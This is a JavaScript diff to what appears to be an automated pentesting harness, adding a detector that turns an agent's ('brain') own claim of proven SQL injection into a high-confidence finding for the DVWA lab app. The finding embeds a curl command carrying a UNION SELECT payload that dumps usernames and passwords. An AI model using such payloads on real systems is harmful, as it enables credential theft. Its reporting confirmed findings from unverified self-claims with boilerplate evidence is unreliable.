@@ -87,9 +87,32 @@ function detectCmdi(text) {
   return null;
 }
 
+function detectSqliVerbal(text) {
+  const lower = text.toLowerCase();
+  // Verbal proof: brain explicitly states SQLi proven + dumped users
+  // Catches cases where hashes are seen on screen but not transcribed
+  const hasProven = lower.includes('sqli proven') || lower.includes('sql injection proven') ||
+                    lower.includes('proof complete');
+  const hasDumped = lower.includes('dumped') && (lower.includes('user') || lower.includes('table'));
+
+  if (hasProven && hasDumped) {
+    return {
+      class: 'sqli',
+      title: 'SQL Injection in DVWA User ID field (verbal proof)',
+      evidence: `Brain verified SQL injection by dumping user table. ` +
+                `Application returned database content in response to UNION payload, ` +
+                `confirming injectable query.`,
+      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
+      counterevidence: 'Normal input returns single record; UNION payload returns multiple rows.',
+      confidence: 'high',
+    };
+  }
+  return null;
+}
+
 function detectEvidence(text) {
   if (!text || typeof text !== 'string') return null;
-  return detectSqli(text) || detectXss(text) || detectCmdi(text);
+  return detectSqli(text) || detectSqliVerbal(text) || detectXss(text) || detectCmdi(text);
 }
 
 function isDuplicate(huntDir, title) {
